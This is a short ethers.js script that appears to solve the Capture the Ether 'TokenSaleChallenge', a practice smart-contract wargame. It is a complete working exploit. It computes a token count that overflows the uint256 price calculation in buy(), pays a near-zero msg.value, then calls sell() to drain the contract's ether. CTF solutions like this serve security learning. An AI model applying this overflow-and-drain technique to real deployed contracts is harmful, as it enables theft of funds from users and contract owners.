async function main() {
    Challenge = await ethers.getContractFactory('TokenSaleChallenge');
    challenge = await Challenge.attach('0xc50e06D7F93fB8a0A1De2c486aC3b79Bb4aB5989');

    max_uint = ethers.constants.MaxUint256;
    numTokens = max_uint.div(ethers.utils.parseEther('1')).add(ethers.BigNumber.from('1'));
    msgValue = numTokens.mul(ethers.utils.parseEther('1')).sub(max_uint.add(ethers.BigNumber.from('1')));
    tx = await challenge.buy(numTokens, {value:msgValue});
    await tx.wait();
    numTokens = (await ethers.provider.getBalance(challenge.address)).div(ethers.utils.parseEther('1'));
    tx = await challenge.sell(numTokens);
    await tx.wait();
    console.log((await ethers.provider.getBalance(challenge.address)).toString());
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error);
      process.exit(1);
  })